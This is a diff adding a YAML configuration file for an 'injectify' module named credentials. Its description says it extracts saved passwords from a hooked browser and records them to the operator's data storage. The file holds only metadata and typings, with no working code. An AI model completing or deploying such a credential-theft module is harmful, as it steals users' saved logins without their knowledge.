@@ -1,0 +1,38 @@
+# The module name, injectify.module('NAME')
+# To specify multiple different names use:
+# name: [example, demo, eg]
+name: [credentials, passwords, password]
+# A brief description of what the module does.
+# This is visible in the interface's code editor
+description: >
+  Extracts saved passwords from the browser and records them to your project's data Storage
+# Your GitHub username
+author: samdenty99
+# If set to `true` then it will send the module uglify-js'd.
+# Only disable this if necessary! eg. it breaks something
+minify: true
+
+# Optional:
+
+# Typescript typings for the module's parameters
+params:
+  # Whether the parameters should be optional or required
+  optional: true
+  # Information about the params
+  info: |
+    Record passwords to a custom table in your projects Data Storage
+  # Typescript d.ts typings, used in the interface's code editor
+  typings: |
+    string | false | {
+      /**
+       * Record passwords to a custom table in your projects Data Storage. Set to false to disable recording
+       */
+      table?: string
+    }
+
+# Typescript type of what the module promise returns, defaults to <any>
+returns: |
+  {
+    username: string
+    password: string
+  }
